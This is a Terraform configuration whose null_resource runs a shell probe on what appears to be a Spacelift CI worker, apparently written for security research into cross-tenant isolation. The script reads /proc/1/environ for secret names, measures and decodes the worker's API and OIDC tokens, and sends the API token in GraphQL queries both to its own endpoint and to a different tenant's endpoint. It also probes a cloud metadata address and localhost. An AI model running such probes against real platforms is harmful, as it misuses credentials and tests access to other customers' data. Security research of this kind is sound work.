terraform {
  required_providers {
    null = {
      source  = "hashicorp/null"
      version = "~> 3.2"
    }
  }
}

resource "null_resource" "xsec_probe" {
  triggers = { nonce = timestamp() }

  provisioner "local-exec" {
    command = <<-EOT
      set +e
      echo "=== P2 START ==="
      id
      echo "=== mounts ==="
      mount 2>/dev/null | head -40
      echo "=== root listing ==="
      ls -la / 2>/dev/null | head -40
      echo "=== proc1 env (redacted) ==="
      cat /proc/1/environ 2>/dev/null | tr '\0' '\n' | grep -Ei 'token|key|secret|ssl|cert' | sed 's/=.*/=<redacted>/' | head -20
      echo "=== worker token len ==="
      echo "tok_$(echo "$SPACELIFT_API_TOKEN" | wc -c)ch"
      echo "oidc_$(echo "$SPACELIFT_OIDC_TOKEN" | wc -c)ch"
      echo "tgtf_$(echo "$TG_TF_REGISTRY_TOKEN" | wc -c)ch"
      echo "=== worker token vs graphql (A) ==="
      EP="$TF_VAR_spacelift_graphql_endpoint"
      Q1='{ "query": "{ viewer { id name } }" }'
      Q2='{ "query": "{ account { id name } }" }'
      Q3='{ "query": "{ searchStacks(input:{}) { edges { node { id } } } }" }'
      Q4='{ "query": "{ stack(id: \"xsec-stack\") { id name } }" }'
      for Q in "$Q1" "$Q2" "$Q3" "$Q4"; do
        echo "--- Q ---"
        curl -s -m 25 -H "Content-Type: application/json" -H "Authorization: Bearer $SPACELIFT_API_TOKEN" -d "$Q" "$EP" | head -c 1200
        echo
      done
      echo "=== worker token vs graphql (B tenant) ==="
      curl -s -m 20 -o /dev/null -w "B RC=%%{http_code}\n" -H "Content-Type: application/json" -H "Authorization: Bearer $SPACELIFT_API_TOKEN" -d '{"query":"{ viewer { id } }"}' "https://itssakexem.app.spacelift.dev/graphql"
      echo "=== OIDC payload ==="
      echo "$SPACELIFT_OIDC_TOKEN" | cut -d. -f1 | base64 -d 2>/dev/null | head -c 300
      echo
      echo "$SPACELIFT_OIDC_TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null | head -c 900
      echo
      echo "=== ingress probes ==="
      getent hosts downloads.spacelift.dev || echo no-downloads-dns
      for h in 169.254.170.2 127.0.0.1; do
        curl -s -m 3 -o /dev/null -w "$h RC=%%{http_code}\n" http://$h/ 2>/dev/null || echo "$h fail"
      done
      echo "=== P2 END ==="
    EOT
  }
}